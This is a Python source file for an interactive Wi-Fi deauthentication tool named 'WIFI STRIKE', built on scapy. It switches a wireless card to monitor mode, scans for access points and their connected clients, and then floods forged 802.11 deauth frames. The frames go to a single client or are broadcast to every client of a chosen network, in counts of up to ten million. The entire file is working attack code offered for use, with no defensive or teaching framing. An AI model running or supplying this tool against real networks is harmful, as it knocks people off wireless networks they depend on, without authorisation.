#!/usr/bin/python3
import subprocess
import psutil
import os
import argparse
import threading
import time
from scapy.all import *

r, g, y, b, p, w = "\033[31m", "\033[32m", "\033[33m", "\033[36m", "\033[35m", "\033[37m"

banner = f"""{w}
  _      ______________
 | | /| / /  _/ __/  _/
 | |/ |/ // // _/_/ /  
 |__/|__/___/_/ /___/ {r}
   _____________  ______ ______
  / __/_  __/ _ \\/  _/ //_/ __/
 _\\ \\  / / / , _// // ,< / _/  
/___/ /_/ /_/|_/___/_/|_/___/  

{g}Wi-Fi Deauth Script by {r}ARXHR007{w}
"""

access_points = {}
unique_clients = {}
stop_sniffing = False
gateway_mac = None

def get_all_interfaces():
    """Get all network interfaces."""
    return psutil.net_if_addrs()

def set_monitor_mode(interface):
    """Set the specified interface to monitor mode."""
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        print(f"{g}Interface {r}{interface} {g}set to monitor mode.{w}")
        return True
    except subprocess.CalledProcessError:
        print(f"{r}Failed to set {y}{interface} {r}to monitor mode{w}")
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        return False

def set_manage_mode(interface):
    """Set the specified interface to managed mode."""
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        print(f"{g}Interface {r}{interface} {g}set to managed mode.{w}")
    except subprocess.CalledProcessError:
        print(f"{r}Failed to set {y}{interface} {r}to managed mode{w}")
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)

def packet_handler(packet):
    """Handle packets to detect access points."""
    if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode() if packet.haslayer(Dot11Elt) else "<hidden>"
        dbm_signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
        stats = packet[Dot11Beacon].network_stats() if packet.haslayer(Dot11Beacon) else {}
        channel = stats.get("channel", "N/A")
        crypto = stats.get("crypto", "N/A")

        if bssid not in access_points:
            access_points[bssid] = {"ssid": ssid, "channel": channel, "signal": dbm_signal, "crypto": crypto}
            print(f"{p}AP detected: {y}BSSID: {b}{bssid}{g}, {y}SSID: {b}{ssid}{g}, {y}Channel: {b}{channel}{g}, {y}Signal: {b}{dbm_signal}{g}, {y}Crypto: {b}{crypto}")

def scan_wifi(interface):
    """Scan for Wi-Fi access points."""
    os.system("clear")
    print(banner)
    print(f"{g}Interface {r}{interface} {g}set to monitor mode.{y}")
    print(f"{g}[{r}*{g}]{y} Scanning for Wi-Fi APs on interface {r}{interface}{p}\n")
    print(f"{g}Press {r}Ctrl + C {g}to stop:{p}\n")

    global stop_sniffing
    stop_sniffing = False

    def change_channel():
        """Change the channel of the interface."""
        ch = 1
        while not stop_sniffing:
            os.system(f"iwconfig {interface} channel {ch}")
            ch = ch % 14 + 1
            time.sleep(0.5)

    channel_thread = threading.Thread(target=change_channel)
    channel_thread.daemon = True
    channel_thread.start()

    try:
        sniff(iface=interface, prn=packet_handler, stop_filter=lambda x: stop_sniffing)
    except KeyboardInterrupt:
        stop_sniffing = True

    os.system("clear")
    print(banner)
    print(f"{y}Detected Access Points{r}:\n")
    for k, (bssid, info) in enumerate(access_points.items(), start=1):
        print(f"{g}[{r}{k}{g}]{y} BSSID: {b}{bssid}{g}, {y}SSID: {b}{info['ssid']}{g}, {y}Channel: {b}{info['channel']}{g}, {y}Signal: {b}{info['signal']}{g}, {y}Crypto: {b}{info['crypto']}")

    if not access_points:
        print(f"{r}No access points detected.")
        return None

    selection = int(input(f"\n{y}Enter the selection{r}{y}: "))
    selected_bssid = list(access_points.keys())[selection - 1]
    return selected_bssid

def packet_handler1(packet):
    """Handle packets to detect clients."""
    if packet.haslayer(Dot11) and packet.type == 2:
        bssid = packet.addr3
        client = packet.addr2
        if bssid == gateway_mac and client not in unique_clients:
            dbm_signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
            unique_clients[client] = dbm_signal
            print(f"{p}Client detected: {y}Client MAC: {b}{client}{g}, {y}Signal: {b}{dbm_signal}")

def scan_clients(interface, target_bssid):
    """Scan for clients connected to the specified access point."""
    print(f"{g}[{y}*{g}]{y} Scanning for clients connected to AP with BSSID {r}{target_bssid}{y} on interface {r}{interface}{p}\n")
    print(f"{g}Press {r}Ctrl + C {g}to stop:\n")

    try:
        sniff(iface=interface, prn=packet_handler1)
    except KeyboardInterrupt:
        pass

    os.system("clear")
    print(banner)
    print(f"\n{g}Detected Clients{r}:\n")
    for k, client in enumerate(unique_clients.keys(), start=1):
        print(f"{g}[{r}{k}{g}]{y} Client MAC: {b}{client}{g}, {y}Signal: {b}{unique_clients[client]}")

    print(f"{g}[{r}0{g}]{r} Deauth all")
    selection = int(input(f"\n{y}Select the client{r}:{y}"))
    return "0" if selection == 0 else list(unique_clients.keys())[selection - 1]

def deauth(target_mac, gateway_mac, interface):
    """Send deauthentication packets to the target MAC address."""
    os.system("clear")
    print(banner)
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"{y}Sending deauthentication packets to {b}{target_mac}{y} from {b}{gateway_mac}{y}:{g}\n")
    print(f"{y}Press {r}Ctrl + C {y}to stop{g}")
    sendp(frame, iface=interface, count=10000000, inter=0.1, verbose=1)
    print(f"{y}\nDeauth packets sent.")

def deauthall(interface, target_bssid, count):
    """Send deauthentication packets to all clients connected to the target BSSID."""
    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
    print(f"{y}Sending deauth packets to {b}{target_bssid}{y}:\n")
    print(f"{y}Press {r}Ctrl + C {y}to stop{g}")
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=1)
    print(f"{y}\nDeauth packets sent.")

def auto_interface():
    """Automatically find and set a suitable network interface to monitor mode."""
    print(f"{g}Searching for network interface{r}:{p}")
    interfaces = get_all_interfaces().keys()
    for iface in list(interfaces)[::-1]:
        print(f"{g}Attempting to set {b}{iface}{g} to monitor mode{w}")
        if set_monitor_mode(iface):
            os.system("clear")
            print(banner)
            return iface
    subprocess.run(["systemctl", "start", "NetworkManager"])
    print(f"{r}No suitable interface found.{w}")
    exit()

def man_interface(interface):
    """Set the specified interface to managed mode."""
    if interface not in get_all_interfaces().keys():
        print(f"{r}No interface found with that name{w}")
        subprocess.run(["systemctl", "start", "NetworkManager"])
        exit()
    print(f"Attempting to set {interface} to managed mode...")
    if set_manage_mode(interface):
        os.system("clear")
        print(f"Interface {interface} set to managed mode.")
    else:
        print(f"{r}Something went wrong with the interface{w}")
        subprocess.run(["systemctl", "start", "NetworkManager"])
        exit()

def main():
    """Main function to execute the script."""
    os.system("clear")
    print(banner)
    global gateway_mac
    parser = argparse.ArgumentParser(description="Wi-Fi deauth script")
    parser.add_argument("--man", type=str, help="Set interface to managed mode")
    parser.add_argument("--mon", type=str, help="Set interface to monitor mode")
    parser.add_argument("--interface", type=str, help="Set interface to use")
    parser.add_argument("-l", "--list_interface", action='store_true', help="List interfaces to use")
    parser.add_argument("-t", "--target_mac", type=str, help="Target MAC address")
    parser.add_argument("-g", "--gateway_mac", type=str, help="Gateway MAC address")
    parser.add_argument("-sw", "--scan_wifi", action='store_true', help="Scan Wi-Fi available")
    parser.add_argument("-st", "--scan_target", action='store_true', help="Scan clients available")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print(f"{g}[{r}!{g}]{r} Run it as root{w}\n")
        print(f"{g}ex: {r}$ {y}sudo wifistrike{w}\n")
        exit()

    if args.man:
        man_interface(args.man)
        return
    elif args.scan_wifi:
        interface = args.interface if args.interface else auto_interface()
        scan_wifi(interface)
        set_manage_mode(interface)
        exit()
    elif args.scan_target:
        interface = args.interface if args.interface else auto_interface()
        gateway_mac = args.gateway_mac if args.gateway_mac else scan_wifi(interface)
        scan_clients(interface, gateway_mac)
        set_manage_mode(interface)
        exit()
    elif args.mon:
        man_interface(args.mon)
        return
    elif args.list_interface:
        print("Network interfaces:")
        for i in get_all_interfaces().keys():
            print(f"{b}{i}")
        return
    elif args.interface:
        man_interface(args.interface)
        interface = args.interface
    else:
        interface = auto_interface()

    gateway_mac = args.gateway_mac if args.gateway_mac else scan_wifi(interface)
    target_mac = args.target_mac if args.target_mac else scan_clients(interface, gateway_mac)

    os.system("clear")
    if target_mac == "0":
        deauthall(interface, gateway_mac, 1000000)
    else:
        deauth(target_mac, gateway_mac, interface)

    set_manage_mode(interface)
    print(f"{y}\nCheckout other tools at GitHub: {r}arxhr007")
    print(f"{p}Thank you{w}")

if __name__ == "__main__":
    main()
